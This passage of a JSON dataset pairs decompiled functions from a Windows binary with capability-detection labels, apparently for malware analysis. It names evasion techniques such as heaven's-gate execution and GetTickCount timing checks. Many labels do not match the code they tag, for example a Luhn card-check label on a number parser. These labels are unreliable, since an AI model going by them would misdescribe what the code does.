        "decompiled_code": "\nvoid __fastcall fcn.00438230(uchar *param_1, uint32_t param_2)\n\n{\n    int32_t iVar1;\n    \n    *param_1 = 0xf;\n    // switch table (44 cases) at 0x438279\n    switch(param_2 & 0xff) {\n    default:\n        *(param_1 + 4) = 0;\n        iVar1 = 0;\n        break;\n    case 2:\n    case 3:\n    case 4:\n    case 5:\n    case 6:\n        *(param_1 + 4) = 1;\n        iVar1 = 2;\n        break;\n    case 7:\n    case 8:\n    case 9:\n    case 10:\n    case 0xb:\n        *(param_1 + 4) = 2;\n        iVar1 = 7;\n        break;\n    case 0xc:\n    case 0xd:\n    case 0xe:\n    case 0xf:\n    case 0x10:\n        *(param_1 + 4) = 3;\n        iVar1 = 0xc;\n        break;\n    case 0x11:\n    case 0x12:\n    case 0x13:\n    case 0x14:\n    case 0x15:\n        *(param_1 + 4) = 4;\n        iVar1 = 0x11;\n        break;\n    case 0x16:\n    case 0x17:\n    case 0x18:\n    case 0x19:\n    case 0x1a:\n        *(param_1 + 4) = 5;\n        iVar1 = 0x16;\n        break;\n    case 0x1b:\n    case 0x1c:\n    case 0x1d:\n    case 0x1e:\n    case 0x1f:\n        *(param_1 + 4) = 6;\n        iVar1 = 0x1b;\n        break;\n    case 0x20:\n    case 0x21:\n    case 0x22:\n    case 0x23:\n    case 0x24:\n        *(param_1 + 4) = 7;\n        iVar1 = 0x20;\n        break;\n    case 0x25:\n    case 0x26:\n    case 0x27:\n    case 0x28:\n    case 0x29:\n        *(param_1 + 4) = 8;\n        iVar1 = 0x25;\n        break;\n    case 0x2a:\n        *(param_1 + 4) = 9;\n        iVar1 = 0x2a;\n        break;\n    case 0x2b:\n        *(param_1 + 4) = 10;\n        iVar1 = 0x2b;\n    }\n    *(param_1 + 8) = ((param_2 & 0x7f) - iVar1) + 1;\n    return;\n}\n",
        "token_count": 654
    },
    "00438348": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00438348(uchar *param_1, uint32_t param_2)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    \n    *param_1 = 0x12;\n    uVar1 = param_2 & 0xff;\n    if (uVar1 < 0x14) {\n        if (uVar1 - 2 < 6) {\n            *(param_1 + 4) = 1;\n            iVar2 = 2;\n            goto code_r0x004383d6;\n        }\n        if (uVar1 - 8 < 6) {\n            *(param_1 + 4) = 2;\n            iVar2 = 8;\n            goto code_r0x004383d6;\n        }\n        if (uVar1 - 0xe < 6) {\n            *(param_1 + 4) = 3;\n            iVar2 = 0xe;\n            goto code_r0x004383d6;\n        }\n    }\n    else {\n        if (uVar1 - 0x14 < 6) {\n            *(param_1 + 4) = 4;\n            iVar2 = 0x14;\n            goto code_r0x004383d6;\n        }\n        if (uVar1 - 0x1a < 6) {\n            *(param_1 + 4) = 5;\n            iVar2 = 0x1a;\n            goto code_r0x004383d6;\n        }\n        if (uVar1 - 0x20 < 6) {\n            *(param_1 + 4) = 6;\n            iVar2 = 0x20;\n            goto code_r0x004383d6;\n        }\n    }\n    *(param_1 + 4) = 0;\n    iVar2 = 0;\ncode_r0x004383d6:\n    *(param_1 + 8) = ((param_2 & 0x7f) - iVar2) + 1;\n    return;\n}\n",
        "token_count": 445
    },
    "004383e0": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004383e0(uchar *param_1, uint32_t param_2)\n\n{\n    int32_t iVar1;\n    \n    *param_1 = 0x17;\n    // switch table (105 cases) at 0x438466\n    switch(param_2 & 0xff) {\n    default:\n        *(param_1 + 4) = 0;\n        iVar1 = 0;\n        break;\n    case 2:\n    case 3:\n    case 4:\n        *(param_1 + 4) = 1;\n        iVar1 = 2;\n        break;\n    case 5:\n    case 6:\n    case 7:\n        *(param_1 + 4) = 2;\n        iVar1 = 5;\n        break;\n    case 8:\n    case 9:\n    case 10:\n        *(param_1 + 4) = 3;\n        iVar1 = 8;\n        break;\n    case 0xb:\n    case 0xc:\n    case 0xd:\n        *(param_1 + 4) = 4;\n        iVar1 = 0xb;\n        break;\n    case 0xe:\n    case 0xf:\n    case 0x10:\n        *(param_1 + 4) = 5;\n        iVar1 = 0xe;\n        break;\n    case 0x11:\n    case 0x12:\n    case 0x13:\n        *(param_1 + 4) = 6;\n        iVar1 = 0x11;\n        break;\n    case 0x14:\n    case 0x15:\n        *(param_1 + 4) = 7;\n        iVar1 = 0x14;\n        break;\n    case 0x16:\n    case 0x17:\n        *(param_1 + 4) = 8;\n        iVar1 = 0x16;\n        break;\n    case 0x18:\n    case 0x19:\n        *(param_1 + 4) = 9;\n        iVar1 = 0x18;\n        break;\n    case 0x1a:\n    case 0x1b:\n        *(param_1 + 4) = 10;\n        iVar1 = 0x1a;\n        break;\n    case 0x1c:\n    case 0x1d:\n        *(param_1 + 4) = 0xb;\n        iVar1 = 0x1c;\n        break;\n    case 0x1e:\n    case 0x1f:\n        *(param_1 + 4) = 0xc;\n        iVar1 = 0x1e;\n        break;\n    case 0x20:\n    case 0x21:\n    case 0x22:\n    case 0x23:\n        *(param_1 + 4) = 0xd;\n        iVar1 = 0x20;\n        break;\n    case 0x24:\n    case 0x25:\n    case 0x26:\n    case 0x27:\n        *(param_1 + 4) = 0xe;\n        iVar1 = 0x24;\n        break;\n    case 0x28:\n    case 0x29:\n    case 0x2a:\n    case 0x2b:\n        *(param_1 + 4) = 0xf;\n        iVar1 = 0x28;\n        break;\n    case 0x2c:\n    case 0x2d:\n    case 0x2e:\n    case 0x2f:\n        *(param_1 + 4) = 0x10;\n        iVar1 = 0x2c;\n        break;\n    case 0x30:\n    case 0x31:\n    case 0x32:\n    case 0x33:\n        *(param_1 + 4) = 0x11;\n        iVar1 = 0x30;\n        break;\n    case 0x34:\n    case 0x35:\n    case 0x36:\n    case 0x37:\n        *(param_1 + 4) = 0x12;\n        iVar1 = 0x34;\n        break;\n    case 0x38:\n    case 0x39:\n    case 0x3a:\n    case 0x3b:\n        *(param_1 + 4) = 0x13;\n        iVar1 = 0x38;\n        break;\n    case 0x3c:\n    case 0x3d:\n    case 0x3e:\n    case 0x3f:\n        *(param_1 + 4) = 0x14;\n        iVar1 = 0x3c;\n        break;\n    case 0x40:\n    case 0x41:\n    case 0x42:\n    case 0x43:\n        *(param_1 + 4) = 0x15;\n        iVar1 = 0x40;\n        break;\n    case 0x44:\n    case 0x45:\n    case 0x46:\n    case 0x47:\n        *(param_1 + 4) = 0x16;\n        iVar1 = 0x44;\n        break;\n    case 0x48:\n    case 0x49:\n    case 0x4a:\n    case 0x4b:\n        *(param_1 + 4) = 0x17;\n        iVar1 = 0x48;\n        break;\n    case 0x4c:\n    case 0x4d:\n    case 0x4e:\n    case 0x4f:\n        *(param_1 + 4) = 0x18;\n        iVar1 = 0x4c;\n        break;\n    case 0x50:\n    case 0x51:\n    case 0x52:\n    case 0x53:\n        *(param_1 + 4) = 0x19;\n        iVar1 = 0x50;\n        break;\n    case 0x54:\n    case 0x55:\n    case 0x56:\n    case 0x57:\n        *(param_1 + 4) = 0x1a;\n        iVar1 = 0x54;\n        break;\n    case 0x58:\n    case 0x59:\n    case 0x5a:\n    case 0x5b:\n        *(param_1 + 4) = 0x1b;\n        iVar1 = 0x58;\n        break;\n    case 0x5c:\n    case 0x5d:\n    case 0x5e:\n    case 0x5f:\n        *(param_1 + 4) = 0x1c;\n        iVar1 = 0x5c;\n        break;\n    case 0x60:\n        *(param_1 + 4) = 0x1d;\n        iVar1 = 0x60;\n        break;\n    case 0x61:\n        *(param_1 + 4) = 0x1e;\n        iVar1 = 0x61;\n        break;\n    case 0x62:\n        *(param_1 + 4) = 0x1f;\n        iVar1 = 0x62;\n        break;\n    case 99:\n        *(param_1 + 4) = 0x20;\n        iVar1 = 99;\n        break;\n    case 100:\n        *(param_1 + 4) = 0x21;\n        iVar1 = 100;\n        break;\n    case 0x65:\n        *(param_1 + 4) = 0x22;\n        iVar1 = 0x65;\n        break;\n    case 0x66:\n        *(param_1 + 4) = 0x23;\n        iVar1 = 0x66;\n        break;\n    case 0x67:\n        *(param_1 + 4) = 0x24;\n        iVar1 = 0x67;\n        break;\n    case 0x68:\n        *(param_1 + 4) = 0x25;\n        iVar1 = 0x68;\n    }\n    *(param_1 + 8) = ((param_2 & 0x7f) - iVar1) + 1;\n    return;\n}\n",
        "token_count": 1828
    },
    "0046ce08": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046ce08(uint param_1, uint param_2)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h;\n    int32_t iStack4168;\n    uint uStack4164;\n    uchar *puStack4160;\n    uint var_102ch;\n    uint var_1028h;\n    uint var_1024h;\n    uint var_1020h;\n    uint var_101ch;\n    uint32_t var_1ch;\n    uint *var_10h;\n    uint var_ch;\n    \n    puStack4160 = &stack0xfffffffc;\n    var_1020h = 0;\n    uStack4164 = 0x46cef0;\n    iStack4168 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffefb8;\n    uVar1 = fcn.00445c8c();\n    var_1ch = *((uVar1 & 0x7f) * 4 + 0x491e48) | 1;\n    var_10h = &fcn.0046ce08::var_101ch;\n    var_ch = 0x1000;\n    uVar2 = fcn.0044d1c8(0x1305, param_2, &fcn.0046ce08::var_1ch);\n    arg_8h = 0x46ce7a;\n    iVar3 = sub.user32.dll_SendMessageA(uVar2);\n    if (iVar3 == 0) {\n        arg_8h = &fcn.0046ce08::var_1020h;\n        fcn.00406a50();\n        fcn.00409c80(arg_8h);\n        fcn.0046cce4();\n    }\n    fcn.00405010();\n    *in_FS_OFFSET = arg_8h;\n    fcn.00404dc4(0x46cef7);\n    return;\n}\n",
        "token_count": 447
    },
    "0046cfbc": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046cfbc(uint param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h;\n    int32_t iStack80;\n    uint uStack76;\n    uchar *puStack72;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint32_t var_1ch;\n    uint var_10h;\n    uint var_8h;\n    \n    puStack72 = &stack0xfffffffc;\n    var_20h = 0;\n    uStack76 = 0x46d08e;\n    iStack80 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb0;\n    uVar1 = fcn.00445c8c();\n    var_1ch = *((uVar1 & 0x7f) * 4 + 0x491e50) | 3;\n    var_10h = fcn.00405264();\n    var_8h = (**(**(in_EAX + 0x18) + 0xe0))();\n    uVar2 = fcn.0044d1c8(0x1306, param_2, &fcn.0046cfbc::var_1ch);\n    arg_8h = 0x46d02e;\n    iVar3 = sub.user32.dll_SendMessageA(uVar2);\n    if (iVar3 == 0) {\n        arg_8h = &fcn.0046cfbc::var_20h;\n        fcn.00406a50();\n        fcn.00409c80(arg_8h);\n        fcn.0046cce4();\n    }\n    fcn.0046dab8();\n    *in_FS_OFFSET = arg_8h;\n    fcn.00404dc4(0x46d095);\n    return;\n}\n",
        "token_count": 463
    },
    "0046d13c": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046d13c(uint param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h;\n    int32_t iStack80;\n    uint uStack76;\n    uchar *puStack72;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint32_t var_1ch;\n    uint var_10h;\n    uint var_8h;\n    \n    puStack72 = &stack0xfffffffc;\n    var_20h = 0;\n    uStack76 = 0x46d20e;\n    iStack80 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb0;\n    uVar1 = fcn.00445c8c();\n    var_1ch = *((uVar1 & 0x7f) * 4 + 0x491e58) | 3;\n    var_10h = fcn.00405264();\n    var_8h = (**(**(in_EAX + 0x18) + 0xe0))();\n    uVar2 = fcn.0044d1c8(0x1307, param_2, &fcn.0046d13c::var_1ch);\n    arg_8h = 0x46d1ae;\n    iVar3 = sub.user32.dll_SendMessageA(uVar2);\n    if (iVar3 < 0) {\n        arg_8h = &fcn.0046d13c::var_20h;\n        fcn.00406a50();\n        fcn.00409c80(arg_8h);\n        fcn.0046cce4();\n    }\n    fcn.0046dab8();\n    *in_FS_OFFSET = arg_8h;\n    fcn.00404dc4(0x46d215);\n    return;\n}\n",
        "token_count": 466
    },
    "00406c3c": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nulong fcn.00406c3c(void)\n\n{\n    uint in_EAX;\n    \n    return CONCAT44(in_EAX, in_EAX);\n}\n",
        "token_count": 33
    },
    "00408820": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498",
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00408820(ushort *arg_8h)\n\n{\n    uint32_t in_EAX;\n    ushort *in_ECX;\n    uint32_t in_EDX;\n    \n    *in_ECX = in_EAX / (in_EDX & 0xffff);\n    *arg_8h = in_EAX % (in_EDX & 0xffff);\n    return;\n}\n",
        "token_count": 86
    },
    "00430124": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00430124(ushort *arg_8h)\n\n{\n    ushort uVar1;\n    uint32_t in_EAX;\n    int32_t iVar2;\n    uint32_t uVar3;\n    ushort *in_ECX;\n    uint32_t uVar4;\n    ushort *in_EDX;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint var_64h;\n    uint var_30h;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar2 = fcn.00406b88();\n    if (in_EAX == *(iVar2 + 0x10)) {\n        iVar2 = fcn.00406b88();\n        *in_EDX = *(iVar2 + 0x14);\n        iVar2 = fcn.00406b88();\n        *in_ECX = *(iVar2 + 0x16);\n        iVar2 = fcn.00406b88();\n        *arg_8h = *(iVar2 + 0x18);\n    }\n    else {\n        uVar5 = in_EAX & 0xff;\n        uVar4 = in_EAX >> 8 & 0xff;\n        uVar6 = in_EAX >> 0x10 & 0xff;\n        uVar7 = uVar4;\n        if (uVar4 < uVar5) {\n            uVar7 = uVar5;\n        }\n        uVar3 = uVar6;\n        if (uVar6 < uVar7) {\n            uVar3 = uVar7;\n        }\n        if (uVar5 < uVar4) {\n            uVar4 = uVar5;\n        }\n        if (uVar4 < uVar6) {\n            uVar6 = uVar4;\n        }\n        if (uVar3 == uVar6) {\n            *in_EDX = 0xa0;\n            uVar1 = fcn.00403154();\n            *in_ECX = uVar1;\n            *arg_8h = 0;\n        }\n        else {\n            uVar1 = fcn.00403154();\n            *in_EDX = uVar1;\n            uVar1 = fcn.00403154();\n            *in_ECX = uVar1;\n            uVar1 = fcn.00403154();\n            *arg_8h = uVar1;\n        }\n        iVar2 = fcn.00406b88();\n        *(iVar2 + 0x10) = in_EAX;\n        iVar2 = fcn.00406b88();\n        *(iVar2 + 0x14) = *in_EDX;\n        iVar2 = fcn.00406b88();\n        *(iVar2 + 0x16) = *in_ECX;\n        iVar2 = fcn.00406b88();\n        *(iVar2 + 0x18) = *arg_8h;\n    }\n    return;\n}\n",
        "token_count": 643
    },
    "004038e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004038e0(uint param_1, int32_t *param_2)\n\n{\n    bool bVar1;\n    uint8_t *in_EAX;\n    uint32_t uVar2;\n    uint8_t uVar3;\n    uint8_t uVar4;\n    uint8_t *puVar5;\n    uint8_t *puVar6;\n    int32_t iVar7;\n    \n    puVar6 = in_EAX;\n    if (in_EAX == NULL) {\ncode_r0x00403956:\n        puVar6 = puVar6 + 1;\n    }\n    else {\n        uVar2 = 0;\n        do {\n            puVar5 = puVar6;\n            uVar3 = *puVar5;\n            puVar6 = puVar5 + 1;\n        } while (uVar3 == 0x20);\n        bVar1 = false;\n        if (uVar3 == 0x2d) {\n            bVar1 = true;\ncode_r0x00403966:\n            uVar3 = *puVar6;\n            puVar6 = puVar5 + 2;\n        }\n        else if (uVar3 == 0x2b) goto code_r0x00403966;\n        if (((uVar3 == 0x24) || (uVar3 == 0x78)) || (uVar3 == 0x58)) {\ncode_r0x0040396b:\n            uVar3 = *puVar6;\n            puVar6 = puVar6 + 1;\n            if (uVar3 != 0) {\n                do {\n                    if (0x60 < uVar3) {\n                        uVar3 = uVar3 - 0x20;\n                    }\n                    uVar4 = uVar3 - 0x30;\n                    if (9 < uVar4) {\n                        if (5 < uVar3 + 0xbf) goto code_r0x0040395f;\n                        uVar4 = uVar3 - 0x37;\n                    }\n                    if (0xfffffff < uVar2) goto code_r0x0040395f;\n                    uVar2 = uVar2 * 0x10 + uVar4;\n                    uVar3 = *puVar6;\n                    puVar6 = puVar6 + 1;\n                } while (uVar3 != 0);\ncode_r0x004039a8:\n                iVar7 = 0;\n                goto code_r0x004039ab;\n            }\n            goto code_r0x00403956;\n        }\n        if (uVar3 != 0x30) {\n            if (uVar3 != 0) goto code_r0x00403932;\n            goto code_r0x0040395f;\n        }\n        uVar3 = *puVar6;\n        puVar6 = puVar6 + 1;\n        if ((uVar3 == 0x78) || (uVar3 == 0x58)) goto code_r0x0040396b;\n        while (uVar3 != 0) {\ncode_r0x00403932:\n            if ((9 < uVar3 - 0x30) || (0xccccccc < uVar2)) goto code_r0x0040395f;\n            uVar2 = uVar2 * 10 + (uVar3 - 0x30);\n            uVar3 = *puVar6;\n            puVar6 = puVar6 + 1;\n        }\n        if (bVar1) {\n            if ((-1 < uVar2) || (0 < uVar2)) goto code_r0x004039a8;\n        }\n        else if (-1 < uVar2) goto code_r0x004039a8;\n    }\ncode_r0x0040395f:\n    iVar7 = puVar6 - in_EAX;\ncode_r0x004039ab:\n    *param_2 = iVar7;\n    return;\n}\n",
        "token_count": 857
    },
    "0040b494": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nbool __cdecl fcn.0040b494(char *arg_8h)\n\n{\n    uint16_t uVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint16_t *in_ECX;\n    int32_t *in_EDX;\n    int32_t iVar3;\n    uint var_8h;\n    uint var_4h;\n    \n    *arg_8h = '\\0';\n    fcn.0040b470();\n    iVar3 = *in_EDX;\n    uVar1 = 0;\n    while( true ) {\n        iVar2 = fcn.00405060();\n        if (((iVar2 < iVar3) || (9 < *(in_EAX + -1 + iVar3) - 0x30U)) || (999 < uVar1)) break;\n        uVar1 = uVar1 * 10 + (*(in_EAX + -1 + iVar3) - 0x30);\n        iVar3 = iVar3 + 1;\n    }\n    iVar2 = *in_EDX;\n    if (iVar2 < iVar3) {\n        *arg_8h = iVar3 - *in_EDX;\n        *in_EDX = iVar3;\n        *in_ECX = uVar1;\n    }\n    return iVar2 < iVar3;\n}\n",
        "token_count": 281
    },
    "00428448": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23"
        ],
        "decompiled_code": "\nint32_t * fcn.00428448(void)\n\n{\n    uint arg_ch;\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h;\n    int32_t iStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_18h;\n    int32_t *var_8h;\n    uint var_4h;\n    \n    puStack44 = 0x428462;\n    var_8h = fcn.00426010();\n    uStack48 = 0x428527;\n    iStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    puStack44 = &stack0xfffffffc;\n    (**(*var_8h + 0x40))();\n    (**(*var_8h + 0x34))();\n    fcn.004265e4();\n    fcn.004215f0();\n    fcn.004214d4();\n    arg_ch = (**(*var_8h + 0x20))();\n    arg_8h = &fcn.00428448::var_18h;\n    (**(*var_8h + 0x2c))();\n    fcn.00413a94(arg_8h, arg_ch);\n    fcn.00421878();\n    uVar4 = 0;\n    do {\n        uVar3 = 0;\n        do {\n            uVar1 = uVar4 & 0x80000001;\n            if (uVar1 < 0) {\n                uVar1 = (uVar1 - 1 | 0xfffffffe) + 1;\n            }\n            uVar2 = uVar3 & 0x80000001;\n            if (uVar2 < 0) {\n                uVar2 = (uVar2 - 1 | 0xfffffffe) + 1;\n            }\n            if (uVar1 == uVar2) {\n                fcn.00421c1c(var_4h);\n            }\n            uVar3 = uVar3 + 1;\n        } while (uVar3 != 9);\n        uVar4 = uVar4 + 1;\n    } while (uVar4 != 9);\n    fcn.004262a0();\n    *in_FS_OFFSET = arg_8h;\n    return var_8h;\n}\n",
        "token_count": 537
    },
    "004195e8": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nunkbyte10 fcn.004195e8(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    unkbyte10 Stack16;\n    \n    cVar1 = fcn.0041a764();\n    if (cVar1 == '\\x05') {\n        fcn.00418c50();\n    }\n    else {\n        *(in_EAX + 0x10) = *(in_EAX + 0x10) + -1;\n        Stack16 = fcn.00419620();\n    }\n    return Stack16;\n}\n",
        "token_count": 120
    },
    "00446670": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00446670(uint *param_1, uint *param_2)\n\n{\n    uint8_t uVar1;\n    uint uVar2;\n    uint uVar3;\n    int32_t *in_EAX;\n    uint uVar4;\n    \n    if (*(in_EAX + 0x5b) == '\\x05') {\n        uVar4 = CONCAT31(in_EAX >> 8, 1);\n    }\n    else {\n        uVar2 = *param_2;\n        uVar3 = *param_1;\n        uVar4 = (**(*in_EAX + 0x34))();\n        uVar1 = *(in_EAX + 0x5b);\n        if ((uVar1 == 0) || (uVar1 - 3 < 2)) {\n            *param_2 = uVar2;\n        }\n        param_2 = uVar1 - 3;\n        if (uVar1 < 3) {\n            *param_1 = uVar3;\n            param_2 = param_1;\n        }\n    }\n    return CONCAT44(param_2, uVar4);\n}\n",
        "token_count": 247
    },
    "00483cf8": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nvoid fcn.00483cf8(void)\n\n{\n    int32_t *in_EAX;\n    \n    // switch table (6 cases) at 0x483d07\n    switch(in_EAX[10]) {\n    case 0:\n        fcn.00483d6c();\n        return;\n    case 1:\n        fcn.00483d6c();\n        return;\n    case 2:\n        fcn.00483d6c();\n        return;\n    case 3:\n        fcn.00483d6c();\n        return;\n    case 4:\n        fcn.00483d6c();\n        return;\n    case 5:\n        fcn.00483d6c();\n        return;\n    default:\n        *(*in_EAX + 0x14) = 9;\n        (***in_EAX)();\n        return;\n    }\n}\n",
        "token_count": 186
    },
    "00403d60": {
        "rules": [
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00403d60(void)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint *puStack20;\n    uint var_ch;\n    uint32_t var_8h;\n    uint hKey;\n    \n    var_8h = *0x490020;\n    puStack20 = &fcn.00403d60::hKey;\n    uStack24 = 1;\n    uStack28 = 0;\n    uStack32 = 0x403df8;\n    uStack36 = 0x80000002;\n    puStack40 = 0x403d87;\n    iVar1 = sub.advapi32.dll_RegOpenKeyExA();\n    if (iVar1 == 0) {\n        uStack44 = 0x403dd1;\n        uStack48 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffd0;\n        var_ch = 4;\n        uVar2 = hKey;\n        puStack40 = &stack0xfffffffc;\n        sub.advapi32.dll_RegQueryValueExA(hKey, 0x403e14, 0, 0, &fcn.00403d60::var_8h, &fcn.00403d60::var_ch);\n        *in_FS_OFFSET = uVar2;\n        sub.advapi32.dll_RegCloseKey(hKey, 0x403dd8);\n        return;\n    }\n    *0x490020 = *0x490020 & 0xffc0 | var_8h & 0x3f;\n    return;\n}\n",
        "token_count": 397
    },
    "0040422c": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0040422c(uint param_1, uint8_t *param_2)\n\n{\n    uint16_t *puVar1;\n    int32_t *in_EAX;\n    int32_t *piVar2;\n    uint32_t uVar3;\n    uint8_t uVar4;\n    int32_t *piVar5;\n    uint32_t uVar6;\n    \n    uVar3 = 0;\n    uVar6 = 0;\n    uVar4 = *param_2;\n    piVar2 = in_EAX;\n    do {\n        puVar1 = *(*piVar2 + -0x38);\n        if (puVar1 != NULL) {\n            uVar6 = uVar6 & 0xffff0000 | *puVar1;\n            piVar5 = puVar1 + 3;\n            do {\n                uVar3 = uVar3 & 0xffffff00 | *(piVar5 + 6);\n                if (*(piVar5 + 6) == uVar4) {\n                    while (((*(uVar3 + 6 + piVar5) ^ param_2[uVar3]) & 0xdf) == 0) {\n                        uVar3 = uVar3 - 1;\n                        if (uVar3 == 0) {\n                            piVar2 = *piVar5 + in_EAX;\n                            goto code_r0x00404278;\n                        }\n                    }\n                    uVar4 = *param_2;\n                    uVar3 = uVar3 & 0xffffff00 | *(piVar5 + 6);\n                }\n                piVar5 = uVar3 + 7 + piVar5;\n                uVar6 = uVar6 - 1;\n            } while (uVar6 != 0);\n        }\n        piVar2 = *(*piVar2 + -0x24);\n    } while (piVar2 != NULL);\ncode_r0x00404278:\n    return CONCAT44(in_EAX, piVar2);\n}\n",
        "token_count": 427
    },
    "00408a2c": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00408a2c(uint32_t param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    bool bVar7;\n    \n    uVar2 = param_1 ^ 0xffffffff;\n    iVar1 = in_EAX + param_1 + -8;\n    iVar5 = param_2 + param_1 + -8;\n    iVar3 = uVar2 + 9;\n    if (iVar3 == 0 || SCARRY4(uVar2, 9) != iVar3 < 0) {\n        if (*(iVar3 + iVar1) != *(iVar3 + iVar5)) {\n            return 0;\n        }\n        uVar6 = iVar3 + iVar1 & 3;\n        iVar3 = (uVar2 + 0xd) - uVar6;\n        iVar4 = iVar3;\n        if (iVar3 == 0 || uVar2 + 0xd < uVar6) {\n            do {\n                if (*(iVar4 + iVar1) != *(iVar4 + iVar5)) {\n                    return 0;\n                }\n                if (*(iVar4 + 4 + iVar1) != *(iVar4 + 4 + iVar5)) {\n                    return 0;\n                }\n                iVar3 = iVar4 + 8;\n                if (iVar3 != 0 && SCARRY4(iVar4, 8) == iVar3 < 0) break;\n                if (*(iVar3 + iVar1) != *(iVar3 + iVar5)) {\n                    return 0;\n                }\n                if (*(iVar4 + 0xc + iVar1) != *(iVar4 + 0xc + iVar5)) {\n                    return 0;\n                }\n                bVar7 = SCARRY4(iVar3, 8);\n                iVar3 = iVar4 + 0x10;\n                iVar4 = iVar3;\n            } while (iVar3 == 0 || bVar7 != iVar3 < 0);\n        }\n    }\n    if (iVar3 < 5) {\n        if (*(iVar3 + iVar1) != *(iVar3 + iVar5)) {\n            return 0;\n        }\n        iVar3 = iVar3 + 4;\n    }\n    if (iVar3 < 7) {\n        if (*(iVar3 + iVar1) != *(iVar3 + iVar5)) {\n            return 0;\n        }\n        iVar3 = iVar3 + 2;\n    }\n    if ((iVar3 < 8) && (*(in_EAX + param_1 + -1) != *(param_2 + param_1 + -1))) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 609
    },
    "004043b4": {
        "rules": [
            "64-bit execution via heavens gate/d0eb93f2c5e64800b89b59bc3f7592fa",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004043b4(void)\n\n{\n    return;\n}\n",
        "token_count": 16
    },
    "00404878": {
        "rules": [
            "64-bit execution via heavens gate/d0eb93f2c5e64800b89b59bc3f7592fa"
        ],
